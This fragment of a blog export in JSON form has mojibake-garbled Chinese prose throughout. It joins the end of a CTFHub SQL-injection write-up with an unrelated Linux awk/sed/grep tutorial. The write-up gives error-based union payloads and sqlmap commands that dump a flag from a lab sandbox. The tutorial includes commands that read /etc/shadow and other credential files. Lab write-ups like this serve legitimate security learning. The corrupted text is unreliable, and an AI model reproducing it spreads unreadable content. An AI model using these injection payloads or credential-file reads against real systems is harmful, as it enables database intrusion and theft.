æŠ¥é”™æ³¨å…¥\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ«ã€ä¸ºæ•°å­—å‹æ³¨å…¥ã€‘\n1\n#ç¡®å®šå­—æ®µæ•°ã€å­—æ®µæ•°ä¸º2ã€‘\n\n1 order by 1\n1 order by 2\n1 order by 3 æŠ¥é”™\n\n#è·å–æ•°æ®åº“åã€Duplicate entry 'sqli-1' for key 'group_key'ã€‘æ³¨æ„ï¼šæœ‰å¯èƒ½è¦å¤šæŸ¥å‡ æ¬¡æ‰èƒ½æˆåŠŸ\n-1 union select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a\n\n#è·å–è¡¨åã€ Duplicate entry 'flag-1' for key 'group_key'ã€‘\n-1 union select count(*),concat_ws('-',(select table_name from information_schema.tables where table_schema='sqli' limit 1,1),floor(rand()*2))as a from information_schema.tables group by a\n#å› ä¸ºSubquery returns more than 1 rowï¼Œæ‰€ä»¥ç”¨limitæ¥æ§åˆ¶è¾“å‡º,è¿æ¥å‡½æ•°ä¹Ÿä¸ç®¡ç”¨\n\n-1 union select count(*),concat_ws('-',(select concat(table_name) from information_schema.tables where table_schema='sqli'),floor(rand()*2))as a from information_schema.tables group by a\n\n#è·å–åˆ—åã€Duplicate entry 'flag-0' for key 'group_key'ã€‘\n-1 union select count(*),concat_ws('-',(select column_name from information_schema.columns where table_name='flag'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a\n\n#çˆ†å€¼ã€Duplicate entry 'ctfhub{64d51cbcc3eb2513447c46282c921601c14da36b}-1' for key 'group_key'ã€‘\n-1 union select count(*),concat_ws('-',(select flag from flag limit 0,1),floor(rand()*2))as a from information_schema.tables group by a\n\n```\n\n![image-20200718201155785](../images/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-Web/image-20200718201155785.png)\n\n### å¸ƒå°”ç›²æ³¨\n\nç›´æ¥ä½¿ç”¨sqlmapå·¥å…·è·‘\n\n```\n--batch: ç”¨æ­¤å‚æ•°ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼ä¸€ç›´è¿è¡Œä¸‹å»ã€‚\n--technique:é€‰æ‹©æ³¨å…¥æŠ€æœ¯ï¼ŒBã€Tã€Eã€Uã€S\n--threads 10 :è®¾ç½®çº¿ç¨‹ä¸º10ï¼Œè¿è¡Œé€Ÿåº¦ä¼šæ›´å¿«\n--dbms:ä¸ä»…å¯ä»¥æŒ‡å®šæ•°æ®åº“ç±»å‹ï¼Œè¿˜å¯ä»¥æŒ‡å®šæ•°æ®åº“ç‰ˆæœ¬\n```\n\n```bash\n#æŸ¥è¯¢æ•°æ®åº“ #ã€sqliã€‘\npython sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T --dbs --batch --threads 10 --dbms=mysql\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€flagã€‘\npython sqlmap.py  -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T -D sqli  --tables --batch --threads 10 --dbms=mysql\n\n#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€flagã€‘\npython sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T -D sqli -T flag --columns --batch --threads 10 --dbms=mysql\n\n#è·å–å­—æ®µä¿¡æ¯ \npython sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id=1 --technique T -D sqli -T flag -C flag --dump --batch --threads 10 --dbms=mysql\n\n#--techniqueä½¿ç”¨å‚æ•°Bè·‘ä¸å‡ºæ¥ï¼Œæ”¹æˆTæ‰è·‘å‡ºæ¥\n```\n\n\n\n### æ—¶é—´ç›²æ³¨\n\n\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n\n\n```\n\n```","tags":["Write-up"],"categories":["CTF"]},{"title":"Linuxæ–‡æœ¬å¤„ç†ä¸‰å‰‘å®¢","url":"/posts/22718.html","content":"\nawkã€sedã€grepæ˜¯linuxæ“ä½œæ–‡æœ¬çš„ä¸‰å¤§åˆ©å™¨ï¼Œåˆç§°æ–‡æœ¬ä¸‰å‰‘å®¢ï¼Œä¹Ÿæ˜¯å¿…é¡»æŒæ¡çš„linuxå‘½ä»¤ä¹‹ä¸€ã€‚ä¸‰è€…çš„åŠŸèƒ½éƒ½æ˜¯å¤„ç†æ–‡æœ¬ï¼Œä½†ä¾§é‡ç‚¹å„ä¸ç›¸åŒï¼Œgrepæ›´é€‚åˆå•çº¯çš„æŸ¥æ‰¾æˆ–åŒ¹é…æ–‡æœ¬ï¼Œsedæ›´é€‚åˆç¼–è¾‘åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œawkæ›´é€‚åˆæ ¼å¼åŒ–æ–‡æœ¬ï¼Œå¯¹æ–‡æœ¬è¿›è¡Œè¾ƒå¤æ‚æ ¼å¼å¤„ç†ã€‚\n\n## awkğŸ‰\n\n### awkç®€ä»‹\n\nâ—†åå­—æ¥æºäºä¸‰ä¸ªä½œè€…çš„åå­—ç®€ç§°\nâ—†é€‚ç”¨äºéœ€è¦æŒ‰åˆ—å¤„ç†çš„æ•°æ®ï¼Œä¸»è¦ç”¨äºæ–‡æœ¬å†…å®¹çš„åˆ†æå¤„ç†ï¼Œä¹Ÿå¸¸ç”¨äºå¤„ç†æ•°æ®ï¼Œç”ŸæˆæŠ¥å‘Š\n\n### awkåŸºæœ¬ç”¨æ³•\n\n#### 1ã€æ‰“å°å¯¹åº”åˆ—\n\n`ifconfig | awk '{print $1,$2,$3}'`  è·å–1ã€2ã€3åˆ—çš„å†…å®¹ï¼Œé»˜è®¤æ¯åˆ—æŒ‰ç©ºæ ¼æˆ–è€…TABé”®åˆ†å‰²ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image002-1591679078851.jpg)\n\n#### 2ã€-F å‚æ•°\n\n`cat /etc/shadow | awk -F: '{print $1}'`   æŒ‡å®š `ï¼š`ä¸ºåˆ†éš”å­—ç¬¦æ¥è·å–è¯¥æ–‡ä»¶çš„ç¬¬1åˆ—çš„åˆ—å€¼ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image004-1591679078852.jpg)\n\n`awk 'BEGIN{FS=\":\"}{print $1}' test.txt`   å†…å»ºå˜é‡ï¼ŒæŒ‡å®š ï¼šä¸ºåˆ†éš”å­—ç¬¦ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image006-1591679078853.jpg)\n\n`awk -F'[ :]' '{print $1}' test.txt`  ä½¿ç”¨å¤šä¸ªåˆ†å‰²ç¬¦ï¼Œåœ¨[]å†…æœ‰ä¸€ä¸ªç©ºæ ¼å’Œ : å­—ç¬¦ï¼Œå…ˆä½¿ç”¨ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œç„¶åå¯¹åˆ†å‰²ç»“æœå†ä½¿ç”¨:è¿›è¡Œåˆ†å‰²ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image008-1591679078853.jpg)\n\n####  3ã€-v å‚æ•°\n\n`awk -vb=3 '{print $1,$b}' test.txt`  è®¾ç½®å˜é‡ï¼Œå³å¯ä»¥ä»»æ„ç»™å®šå˜é‡çš„å€¼ï¼Œåœ¨é€‰æ‹©è¦è¾“å‡ºçš„åˆ—çš„å€¼å°±å¯ä»¥è®¾ç½®ä¸ºè¿™ä¸ªå˜é‡ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image010-1591679078853.jpg)\n\n`awk -vx=2 -vy=fl '{print $1,$x,$1y}' test.txt` é™¤è®¾ç½®æ•°å­—å‹å˜é‡ä»¥å¤–ï¼Œè¿˜èƒ½å¤Ÿåœ¨æŸä¸€åˆ—çš„åˆ—å€¼æœ«å°¾æ·»åŠ å­—ç¬¦ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image012-1591679078853.jpg)\n\n####  4ã€-f å‚æ•°\n\n`awk -f fl.awk test.txt`  ä½¿ç”¨æ–‡ä»¶ä¸­çš„awkå‚æ•°æ¥è·å–ä¿¡æ¯ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image014-1591679078853.jpg)\n\n####  5ã€è¿ç®—ç¬¦\n\n`awk '$1>3' test.txt`  åˆ—å‡ºç¬¬ä¸€åˆ—å€¼å¤§äº3çš„è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image016-1591679078853.jpg)\n\n `awk '$1==3' test.txt`   æ˜¾ç¤ºç¬¬ä¸€åˆ—å€¼ç­‰äº3çš„è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image018-1591679078853.jpg)\n\n \n\n`awk '$1==3 {print $1,$3}â€™ test.txt`   æ˜¾ç¤ºç¬¬ä¸€åˆ—å€¼ç­‰äº3çš„æ‰€åœ¨è¡Œçš„ç¬¬ä¸€åˆ—å’Œç¬¬ä¸‰åˆ—çš„å€¼ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image020-1591679078853.jpg)\n\n \n\n`awk '$1>3 && $4==\"aaaaaa\" {print $1,$2,$3,$4}' test.txt`   æ˜¾ç¤ºç¬¬ä¸€åˆ—å¤§äº3ä¸”ç¬¬å››åˆ—çš„åˆ—å€¼ç­‰äºâ€œaaaaaaâ€çš„æ‰€åœ¨è¡Œçš„ç¬¬1,2,3,4åˆ—çš„åˆ—å€¼ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image022-1591679078853.jpg)\n\n#### 6ã€æ‰“å°æŠ¬å¤´æ–‡\n\n`awk -F:   'BEGIN {print \"---------fulin_test-----------\"} {print $1}' test.txt` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image030-1591679500766.jpg)\n\n## sedğŸ“\n\n### sedç®€ä»‹\n\nâ—†stream editor\nâ—†æ ¹æ®å®šä½åˆ°çš„æ•°æ®è¡Œä¿®æ”¹æ•°æ®ï¼Œä¸»è¦ç”¨äºæ–‡æœ¬å†…å®¹çš„ç¼–è¾‘ï¼Œé»˜è®¤åªå¤„ç†æ¨¡å¼ç©ºé—´ï¼Œä¸æ”¹å˜åŸæ•°æ®\n\n### sedåŸºæœ¬ç”¨æ³•\n\n#### 1ã€-n å‚æ•°\n\n#####  **1.1** **æ˜¾ç¤ºå•è¡Œ**\n\n`sed -n '4p' test.txt` æ˜¾ç¤ºæ–‡ä»¶çš„ç¬¬4è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image002-1591679500761.jpg)\n\n#####  **1.2** **æ˜¾ç¤ºè¡ŒèŒƒå›´**\n\n`sed -n '3,6p' test.txt` æ˜¾ç¤ºæ–‡ä»¶çš„3è‡³6è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image004-1591679500762.jpg)\n\n#####  **1.3** **æ˜¾ç¤ºå…³é”®å­—æ‰€åœ¨è¡Œ**\n\n`sed -n '/aaaa/'p test.txt` æ˜¾ç¤ºåŒ…å«å…³é”®å­—çš„æ‰€æœ‰è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image006-1591679500763.jpg)\n\n#####  1.4 æ˜¾ç¤ºæ•´ä¸ªæ–‡ä»¶\n\n`sed -n '1,$p' test.txt`  æ˜¾ç¤ºæ•´ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­$pä»£è¡¨æœ€åä¸€è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image008-1591679500764.jpg)\n\n`sed -n '/\\$/'p test.txt` ç”±äº$æœ¬èº«å¯¹sedä»£è¡¨ä¸€ç§å«æ„ï¼ˆè¡¨ç¤ºæœ€åä¸€è¡Œï¼‰,è€Œè‹¥éœ€è¦è¿‡æ»¤æ–‡æ¡£æœ¬èº«$å­—ç¬¦ï¼Œè¦è®©$å­—ç¬¦å¤±å»æ„ä¹‰å°±è¦å°†ç”¨\\$è¡¨ç¤º$å­—ç¬¦æœ¬èº«.\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image010-1591679500764.jpg)\n\n#####  **1.5** **æ­£åˆ™è¡¨è¾¾å¼**\n\n `sed -n '/.*fl/'p test.txt` ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼šâ€™. â€˜ â€˜*â€™ â€˜ .*flâ€™ç­‰ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image012-1591679500765.jpg)\n\n#### 2ã€æ¨¡å¼/pattern/= æ˜¾ç¤ºè¡Œå·\n\n`sed '/fl/=' test.txt` ä½¿ç”¨æ¨¡å¼/pattern/=æ˜¾ç¤ºæ–‡ä»¶æ‰€æœ‰å†…å®¹åŠå…³é”®å­—æ‰€åœ¨è¡Œçš„è¡Œå·ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image014-1591679500765.jpg)\n\n`sed -n '/fl/=' test.txt`åœ¨æ¨¡å¼/pattern/=çš„åŸºç¡€ä¸Šæ·»åŠ -nå‚æ•°è¡¨ç¤ºä»…æ˜¾ç¤ºå…³é”®å­—æ‰€åœ¨è¡Œçš„è¡Œå·ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image016-1591679500766.jpg)\n\n#### 3ã€-eå‚æ•°\n\n`sed -n -e'/aaaaaa/=' -e '/fl/=' -e'/abs/=' test.txt` -eå‚æ•°èƒ½å¤Ÿæ”¯æŒå¤šä¸ªæ¨¡å¼/pattern/=ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image018-1591679500766.jpg)\n\n`sed -n -e'/ssaa/'p -e'/bkha/'p test.txt` -eå‚æ•°ä¹Ÿèƒ½å¤Ÿæ”¯æŒå¤šä¸ªâ€™/pattern/â€™pæ¨¡å¼ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image020-1591679500766.jpg)\n\n#### 4ã€æ›¿æ¢åŒ¹é…è¡Œçš„å…³é”®å­—\n\n`sed '2s/a/A/g' test.txt` å°†æ–‡ä»¶çš„ç¬¬2è¡Œçš„æ‰€æœ‰ a å­—ç¬¦å…¨éƒ¨æ›¿æ¢ä¸ºAå­—ç¬¦ã€‚ï¼ˆ2sä»£è¡¨ç¬¬äºŒè¡Œã€/a/A/åŒ¹é…ç¬¬2è¡Œçš„aå­—ç¬¦å¹¶å°†aæ›¿æ¢ä¸ºAï¼Œgä»£è¡¨çš„æ˜¯å…¨å±€ï¼‰ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image022-1591679500766.jpg)\n\nä½†æ˜¯è¿™ç§å…³é”®å­—çš„æ›¿æ¢`å¹¶ä¸ä¼šä¿®æ”¹æºæ–‡ä»¶`ï¼Œä»…æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œåä¸´æ—¶æ€§çš„æ˜¾ç¤ºä¸€æ¬¡ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image024-1591679500766.jpg)\n\n#### 5ã€-iå‚æ•°\n\n `sed -i '4s/a/A/g' test.txt`   **-i** ç›´æ¥ä¿®æ”¹æ–‡ä»¶å†…å®¹ ,æ›¿æ¢ä¿®æ”¹ä¼šä¿å­˜åˆ°æºæ–‡ä»¶ä¸­ã€‚  4sæŒ‡çš„æ˜¯è¿›è¡Œç¬¬å››è¡Œæ›¿æ¢ï¼Œ gä»£æŒ‡çš„å…¨å±€æ›¿æ¢ å°†aæ›¿æ¢æˆAã€‚å¹¶ä¿å­˜æ–‡ä»¶ã€‚\n\n \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image026-1591679500766.jpg)\n\n \n\n#### 6ã€-i.bakå‚æ•°\n\n`sed -i.bak '4d' test.txt` åˆ é™¤æºæ–‡ä»¶çš„ç¬¬4è¡Œï¼Œå¹¶ä¸”å¤‡ä»½ä¸€ä»½æœªè¢«ä¿®æ”¹çš„æºæ–‡ä»¶â€˜.bakâ€™ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image028-1591679500766.jpg)\n\n#### 7ã€sedåº”ç”¨å®ä¾‹\n\n##### 7.1 å®ç”¨æ€§ï¼šè¾¾åˆ°å–ä»»ä½•ä¸€ä¸ªå­—ç¬¦\n\n`ifconfig | sed -n '2p' |awk -F: '{print $2}'|awk '{print $1}'|awk -F. '{print $2}'|awk -F1 '{print $2}'|awk -F8 '{print $1}'`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image032-1591679500766.jpg)\n\n#####  7.2 æˆªå–linuxæ‰€æœ‰ç½‘å¡åŠç½‘å¡çš„MACåœ°å€\n\n`ifconfig | sed -n -e '1p' -e '10p' |awk '{print $1,\"\\t|\\t\"$5}'`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image034-1591679500766.jpg)\n\n \n\n#####  7.3 æˆªå–linuxæ‰€æœ‰ç½‘å¡çš„IPåœ°å€åŠå…¶å­ç½‘æ©ç \n\n`ifconfig | sed -n -e'2p' -e'11p' | awk '{print $2}'|awk -F: '{print $2}'|grep -v '^$'`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image036-1591679500767.jpg)\n\n## grepğŸ’\n\n### grepç®€ä»‹\n\nâ—†global  regular expression print \nâ—†åŸºäºæ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„è¡Œï¼Œä¸»è¦ç”¨äºæ–‡æœ¬å†…å®¹æŸ¥æ‰¾ï¼Œæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼\n\n### grepåŸºæœ¬ç”¨æ³•\n\n#### 1ã€ åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾å…³é”®å­—\n\n `grep \"fl\" /etc/passwd` æœç´¢å…³é”®å­—å¹¶æ‰“å°å‡ºå…³é”®å­—æ‰€åœ¨çš„è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image002.jpg)\n\n##### 1.1  -A å‚æ•°\n\n`grep -A 10 \"fl\" /etc/passwd` æœç´¢å…³é”®å­—å¹¶æ‰“å°å‡ºå…³é”®å­—æ‰€åœ¨çš„è¡Œä»¥åŠå…³é”®å­—ä»¥ä¸‹åè¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image004.jpg)\n\n##### 1.2  -B å‚æ•°\n\n `grep -B 10 \"fl\" /etc/passwd` æœç´¢å…³é”®å­—å¹¶æ‰“å°å‡ºå…³é”®å­—æ‰€åœ¨çš„è¡Œä»¥åŠå…³é”®å­—ä»¥ä¸Šåè¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image006.jpg)\n\n##### 1.3  -C å‚æ•°\n\n`grep -C 10 \"fl\" /etc/passwd` æœç´¢å…³é”®å­—å¹¶æ‰“å°å‡ºå…³é”®å­—æ‰€åœ¨çš„è¡Œä»¥åŠå…³é”®å­—ä»¥ä¸Šä¸‹åè¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image008.jpg)\n\n#### 2ã€ åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾æ¨¡å¼\n\n`grep \"fl\" /etc/passwd /etc/shadow /etc/group /etc/gshadow` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image010.jpg)\n\n#### 3ã€-l å‚æ•°\n\n**ä½œç”¨ï¼šåˆ—å‡ºåŒ…å«å…³é”®å­—çš„æ–‡ä»¶å**\n\n`grep -l \"fl\" /etc/passwd test.txt a.txt /etc/shadow /etc/group /etc/gshadow` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image012.jpg)\n\n#### 4ã€-n å‚æ•°\n\n**ä½œç”¨ï¼šåˆ—å‡ºå…³é”®å­—æ‰€åœ¨çš„è¡Œå·åŠè¡Œçš„å†…å®¹**\n\n`grep -n \"fl\" /etc/passwd` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image014.jpg)\n\n#### 5ã€-v  å‚æ•°\n\n**ä½œç”¨ï¼šæ‰“å°å‡ºä¸åŒ…å«å…³é”®å­—æ‰€æœ‰çš„è¡Œ**\n\n`grep -v \"defaults\" /etc/fstab` \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image016.jpg)\n\n#### 6ã€ ^  ç¬¦å·\n\n**ä½œç”¨ï¼šè¾“å‡ºä»¥æŸä¸ªå…³é”®å­—å¼€å¤´çš„æ‰€æœ‰è¡Œ**\n\n`grep \"^UUID\" /etc/fstab`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image018.jpg)\n\n#### 7ã€ $ ç¬¦å·\n\n**ä½œç”¨ï¼šè¾“å‡ºä»¥æŸä¸ªå…³é”®å­—ç»“å°¾çš„æ‰€æœ‰è¡Œ**\n\n`grep \"bash$\" /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image020.jpg)\n\n**è¿‡æ»¤æ³¨é‡Šå’Œç©ºè¡Œ**ï¼š `grep -v \"#\"  test.txt |grep -v \"^$\"`  å…¶ä¸­ \"^$\" ä»£è¡¨ç©ºè¡Œ\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image022.jpg)\n\n#### 8ã€-r å‚æ•°\n\n**ä½œç”¨ï¼šé€’å½’æŸ¥æ‰¾**\n\n`grep -r -n \"aaaaaa\" .` èƒ½æŠŠä¸€ä¸ªç›®å½•ä¸­åªè¦æ˜¯åŒ…å«å…³é”®å­—çš„æ‰€æœ‰æ–‡ä»¶åŠæ‰€åœ¨çš„è¡Œçš„è¡Œå·éƒ½æ‰“å°å‡ºæ¥ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image024.jpg)\n\n#### 9ã€-i å‚æ•°\n\n**ä½œç”¨ï¼šå¿½ç•¥å¤§å°å†™**\n\n`grep -r -i \"aaaaaa\" .`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image026.jpg)\n\n#### 10ã€-e å‚æ•°\n\n**ä½œç”¨ï¼šå¤šå…³é”®å­—æŸ¥æ‰¾**\n\n`grep -e \"aaaaa\" -e \"bbbb\" test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image028.jpg)\n\næŸ¥çœ‹æ–‡ä»¶ä¸­ç”Ÿæ•ˆçš„é…ç½®ï¼š`grep -v -e \"#\" -e \"^$\" test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image030.jpg)\n\n#### 11ã€-f å‚æ•°\n\n**ä½œç”¨ï¼šä»¥æŒ‡å®šçš„æ–‡ä»¶é‡Œé¢çš„åŒ¹é…æ¨¡å¼å»æœç´¢**\n\n`grep -f tmp.txt /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image032.jpg)\n\n#### 12ã€-c å‚æ•°\n\n**ä½œç”¨ï¼šæ˜¾ç¤ºåŒ¹é…å…³é”®å­—çš„è¡Œæ•°**\n\n`grep -c \"aaaaa\" test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image034.jpg)\n\n \n\n### grepç»“åˆæ­£åˆ™è¡¨è¾¾å¼\n\n####  1ã€^\n\n**ä½œç”¨ï¼š**é”šå®šè¡Œé¦–\n\n `grep ^fl 